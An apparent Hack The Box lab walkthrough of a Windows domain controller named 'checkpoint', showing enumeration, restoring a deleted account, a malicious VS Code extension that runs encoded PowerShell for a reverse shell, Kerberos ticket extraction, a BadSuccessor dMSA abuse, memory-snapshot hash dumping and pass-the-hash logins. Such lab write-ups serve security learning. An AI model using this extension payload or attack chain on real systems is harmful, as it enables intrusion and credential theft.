---
title: "HTB checkpoint walkthrough"
date: 2026-06-13
categories: [HTB, Machines, Season 11]
tags:  [ VS Code, vsix, rce, BadSuccessor]

---





## Enumeration



Start off with an nmap scan as usual

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ sudo nmap -T4 -A -p- 10.129.16.55  -o nmap.txt
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 15:02 -0400
Stats: 7:10:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.36% done; ETC: 16:21 (18:07:46 remaining)
Stats: 7:18:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 54.72% done; ETC: 04:24 (6:03:08 remaining)
Nmap scan report for 10.129.16.55
Host is up (0.24s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 02:36:21Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49672/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  msrpc             Microsoft Windows RPC
49677/tcp open  msrpc             Microsoft Windows RPC
49678/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
49712/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m52s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-14T02:37:28
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   305.07 ms 10.10.14.1
2   296.60 ms 10.129.16.55

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27160.63 seconds

```



Use rusthound for collection since bloodhound-ce-python is failing

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ rusthound-ce -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -i 10.129.16.55 -f dc01.checkpoint.htb -k -z
---------------------------------------------------
Initializing RustHound-CE at 23:17:56 on 06/13/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-14T03:17:56Z INFO  rusthound_ce] Verbosity level: Info
[2026-06-14T03:17:56Z INFO  rusthound_ce] Collection method: All
[2026-06-14T03:17:57Z INFO  rusthound_ce::ldap] Connected to CHECKPOINT.HTB Active Directory!
[2026-06-14T03:17:57Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-06-14T03:17:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-14T03:17:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=checkpoint,DC=htb
[2026-06-14T03:17:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-14T03:17:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=checkpoint,DC=htb
[2026-06-14T03:17:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-14T03:18:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
[2026-06-14T03:18:02Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-14T03:18:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=checkpoint,DC=htb
[2026-06-14T03:18:02Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-14T03:18:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=checkpoint,DC=htb
[2026-06-14T03:18:02Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-06-14T03:18:02Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 19 users parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 8 ous parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-06-14T03:18:02Z INFO  rusthound_ce::json::maker::common] .//20260613231802_checkpoint-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 23:18:02 on 06/13/26! Happy Graphing!


```





## SHELL AS RYAN.BROOKS

alex.turner has write privileges on mark.davies account which means he can restore togther with REANIMATE-TOMBSTONED rights

```bash
──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ bloodyAD --host 10.129.16.55 -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

```



So we restore the mark.davies user account

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint/evil]
└─$ bloodyAD --host 10.129.16.55 -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb set restore 'mark.davies'
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

  
```





mark.davies can write to the DevDrop share which using the share for VS Code extensions 

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ nxc smb 10.129.16.55 -u mark.davies -p 'Checkpoint2024!' -k --shares
SMB         10.129.16.55    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                                  
SMB         10.129.16.55    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.16.55    445    DC01             [*] Enumerated shares
SMB         10.129.16.55    445    DC01             Share           Permissions     Remark
SMB         10.129.16.55    445    DC01             -----           -----------     ------
SMB         10.129.16.55    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.55    445    DC01             C$                              Default share
SMB         10.129.16.55    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                                                                                   
SMB         10.129.16.55    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.55    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.16.55    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.16.55    445    DC01             VMBackups                       

```





 The DC runs a scheduled task that periodically installs .vsix files from DevDrop and launches VS Code as ryan.brooks, which can be exploited to execute our payload.  We craft a malicious .vsix extension, drop it in DevDrop, and when it's installed/loaded by the victim our code runs. 

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ cat evil/package.json
{
  "name": "vscode-helper",
  "displayName": "VSCode Helper",
  "publisher": "approved",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ cat  evil/extension.js
const cp = require('child_process');
function activate(context) {
    cp.exec('powershell -e <BASE64>');
}
function deactivate() {}
module.exports = { activate, deactivate };
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ cat evil/'[Content_Types].xml' 
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
  <Default Extension="vsixmanifest" ContentType="text/xml"/>
</Types>
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ cat  evil/extension.vsixmanifest
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
  <Metadata>
    <Identity Language="en-US" Id="vscode-helper" Version="1.0.0"

┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ cd evil
┌──(kali㉿kali)-[~/htb/reds/checkpoint/evil]
└─$ npx @vscode/vsce package
```



And drop it on the share

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint/evil]
└─$ smbclient //10.129.16.55/DevDrop -U mark.davies%'Checkpoint2024!' -c "put vscode-helper-1.0.0.vsix"     

putting file vscode-helper-1.0.0.vsix as \vscode-helper-1.0.0.vsix (16.8 kB/s) (average 16.8 kB/s)
                                                                                                  
```



Get the shell and the user flag

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ nc -lvnp 9002                                                        
listening on [any] 9002 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.16.55] 55156
whoami   
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> cat c:\users\ryan.brooks\desktop\user.txt
6d89.......795

```



## SHELL AS ADMINISTRATOR

Enumerate domainacl to see what privileges the users have

```bash
PS C:\users\ryan.brooks> Find-InterestingDomainAcl -ResolveGUIDs


ObjectDN                : DC=checkpoint,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : Reanimate-Tombstones
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-3129162710-3498938529-1807524340-1101
IdentityReferenceName   : alex.turner
IdentityReferenceDomain : checkpoint.htb
IdentityReferenceDN     : CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
IdentityReferenceClass  : user

...
...
...

ObjectDN                : OU=DMSAHolder,DC=checkpoint,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3129162710-3498938529-1807524340-1103
IdentityReferenceName   : ryan.brooks
IdentityReferenceDomain : checkpoint.htb
IdentityReferenceDN     : CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
IdentityReferenceClass  : user

ObjectDN                : CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3129162710-3498938529-1807524340-1101
IdentityReferenceName   : alex.turner
IdentityReferenceDomain : checkpoint.htb
IdentityReferenceDN     : CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
IdentityReferenceClass  : user

ObjectDN                : CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3129162710-3498938529-1807524340-1103
IdentityReferenceName   : ryan.brooks
IdentityReferenceDomain : checkpoint.htb
IdentityReferenceDN     : CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
IdentityReferenceClass  : user
```



ryan.brooks  has GenericWrite over svc_deploy and CreateChild on  DMSAHolder organizational unit. Since this is a Windows Server 2025 BadSuccessor exploit is possible here.  

On a post-patch Server 2025 DC (build ≥ 26100.4946), BadSuccessor requires write access to the *target* account's superseded attributes, not just CreateChild on an OU. ryan.brooks can't write Administrator's attributes, but does hold GenericWrite over svc_deploy, so svc_deploy is the impersonation target. svc_deploy is worth taking because it's in the BackupAccess group, which grants read on the VMBackups share.

We will use BadSuccessor attack here to impersonate svc_deploy but first lets get a kerberos ccache from our shell as ryan.brooks

```bash
PS C:\users\ryan.brooks> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: slMSRJj38Gpp5yZT3xj/GdF99Vt9B6W760Ywh2Dw9wo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuiMSA6Orj7m9ECG5I0gRp7mQV4hKY2CAO5CiDXTu+IT/4esusA6RH0Xy+kNYkYAIvgOqrncKmhZcQGRJJzXUxIh4x9WaDn0hw50qrBNU3181nZ0g5PqMLJgwhc5+3Lyti8r6Fwker0gpjJiqwAaRazY4T69MekfgqLfsWjc/kvqMT0i2pXCDSEGozlQtCdDGw0ISWxKvGWOEmBkmPr7eaRlPGetZawNKq88RKSfoQbAKyKe8hdX2oky6HYx9Re572lkUg9rIuBIh3WQlcWtaX8rHztJCAbFPPwEb74OCpSsud5csiZVHjcmTRGVBffZOigcP6oRZxZRWsGOVkSTrKOjrNN+eT5t8eIQh4Scb9zfFp97jDMsEAhEI+DNMTuQPB1npXy4gX1cIcmhJSypGwQDjE/lJVf8dtRPXLXbPZpAz1yjG/ee7D8ymBFI7JB8eNDwYLQ3kI1WZs66gt45qpqV2i7L3OqGx13JX+4Ur2...
...
...
...
...
```



Copy the ticket and convert

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ echo '<BASE64TICKET>' | base64 -d > ryan.kirbi
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ impacket-ticketConverter ryan.kirbi ryan.brooks.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
         
```

Impersonate svc_deploy using bloodyAD

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ export KRB5CCNAME=ryan.brooks.ccache
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k \
  add badSuccessor svcsucc --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
[+] Creating DMSA svcsucc$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : svcsucc$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-14 15:31:43+00:00
EndTime      : 2026-06-14 23:57:42+00:00
RenewTill    : 2026-06-21 13:57:42+00:00
Flags        : renewable, forwardable, enc-pa-rep, pre-authent, forwarded
Keytype      : 18
Key          : 75hRUfN8UiwGIesYhp5lMzZdrf8/nqrkSp1aUs/23AE=
EncodedKirbi : 

    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
[+] dMSA TGT stored in ccache file svcsucc_2G.ccache

dMSA current keys found in TGS:
AES256: db8ef8.................0acdd9dc5b
AES128: c3b4c.........ae9fb
RC4: 352b.........01d

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e160.......ac9
                                       
```



svc_deploy can read  the VMBackup share and on the share there is a vmware snapshot 

```bash
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ nxc smb dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 -M spider_plus

SMB         10.129.16.55    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                                  
SMB         10.129.16.55    445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 
SPIDER_PLUS 10.129.16.55    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.16.55    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.16.55    445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.16.55    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.16.55    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.16.55    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.16.55    445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.16.55    445    DC01             [*] Enumerated shares
SMB         10.129.16.55    445    DC01             Share           Permissions     Remark
SMB         10.129.16.55    445    DC01             -----           -----------     ------
SMB         10.129.16.55    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.55    445    DC01             C$                              Default share
SMB         10.129.16.55    445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                                                                                   
SMB         10.129.16.55    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.55    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.16.55    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.16.55    445    DC01             VMBackups       READ            
SPIDER_PLUS 10.129.16.55    445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.16.55.json".
SPIDER_PLUS 10.129.16.55    445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, DevDrop, IPC$, NETLOGON, SYSVOL, VMBackups)
SPIDER_PLUS 10.129.16.55    445    DC01             [*] SMB Readable Shares:  4 (IPC$, NETLOGON, SYSVOL, VMBackups)
SPIDER_PLUS 10.129.16.55    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.16.55    445    DC01             [*] Total folders found:  18
SPIDER_PLUS 10.129.16.55    445    DC01             [*] Total files found:    14
SPIDER_PLUS 10.129.16.55    445    DC01             [*] File size average:    857.77 MB
SPIDER_PLUS 10.129.16.55    445    DC01             [*] File size min:        22 B
SPIDER_PLUS 10.129.16.55    445    DC01             [*] File size max:        9.5 GB
                                                                                    
┌──(kali㉿kali)-[~/htb/reds/checkpoint]
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.16.55.json 
{
    "NETLOGON": {},
    "SYSVOL": {
        "checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2026-05-09 04:43:48",
            "ctime_epoch": "2026-05-09 04:39:34",
            "mtime_epoch": "2026-05-09 04:43:48",
            "size": "22 B"
 ...
 ...
 ...
        "checkpoint.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2026-05-10 09:58:40",
            "ctime_epoch": "2026-05-09 04:39:34",
            "mtime_epoch": "2026-05-10 09:58:40",
            "size": "4.11 KB"
        }
    },
    "VMBackups": {
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-000001.vmdk": {
            "atime_epoch": "2026-05-09 22:45:21",
            "ctime_epoch": "2026-05-09 22:45:21",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "101.56 MB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem": {
            "atime_epoch": "2026-05-09 22:40:35",
            "ctime_epoch": "2026-05-09 22:40:35",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "2 GB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmsn": {
            "atime_epoch": "2026-05-09 22:40:35",
            "ctime_epoch": "2026-05-09 22:40:35",
            "mtime_epoch": "2026-05-14 18:32:32",
            "size": "131.76 MB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.nvram": {
            "atime_epoch": "2026-05-09 22:38:59",
            "ctime_epoch": "2026-05-09 22:38:59",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "264.49 KB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.scoreboard": {
            "atime_epoch": "2026-05-09 22:45:21",
            "ctime_epoch": "2026-05-09 22:45:21",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "7.46 KB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmdk": {
            "atime_epoch": "2026-05-09 22:38:59",
            "ctime_epoch": "2026-05-09 22:38:59",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "9.5 GB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmsd": {
            "atime_epoch": "2026-05-09 22:38:59",
            "ctime_epoch": "2026-05-09 22:38:59",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "502 B"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmx": {
            "atime_epoch": "2026-05-09 22:45:21",
            "ctime_epoch": "2026-05-09 22:45:21",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "2.68 KB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmxf": {
            "atime_epoch": "2026-05-09 22:22:43",
            "ctime_epoch": "2026-05-09 22:22:43",
            "mtime_epoch": "2026-05-13 09:58:18",
            "size": "274 B"
        }
    }
}                                                                                         
```



Next we download the files then once downloaded use volatility3 to extract the admin NTLM hash

```bash
┌──(venv)─(kali㉿kali)-[~/…/checkpoint/VMBackups/NightlyBackup_2024-11-01/memory forensics]
└─$ python3 ~/tools/volatility3/vol.py -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump
Volatility 3 Framework 2.28.1
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.
/home/kali/tools/volatility3/volatility3/framework/deprecation.py:28: FutureWarning: This API (volatility3.plugins.windows.registry.hashdump.Hashdump.run) will be removed in the first release after 2026-09-25. This plugin has been renamed, please call volatility3.plugins.windows.registry.hashdump.Hashdump rather than volatility3.plugins.windows.hashdump.Hashdump.
  warnings.warn(

User    rid     lmhash  nthash
/home/kali/tools/volatility3/volatility3/framework/deprecation.py:105: FutureWarning: This plugin (volatility3.plugins.windows.hashdump.Hashdump) has been renamed and will be removed in the first release after 2026-09-25. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.registry.hashdump.Hashdump
  warnings.warn(

Administrator   500     aad3b.....04ee        f29........be3b
Guest   501     aad.......4ee        31d6.......9c0
DefaultAccount  503     aad3......404ee        31d.......89c0
WDAGUtilityAccount      504     aad3.......4ee        28f8......479

```



Log in and get the flag from max.palmer's dir 

```bash
┌──(kali㉿kali)-[~/…/checkpoint/VMBackups/NightlyBackup_2024-11-01/memory forensics]
└─$ evil-winrm-py -i 10.129.16.55 -u administrator -H f29e9......be3b
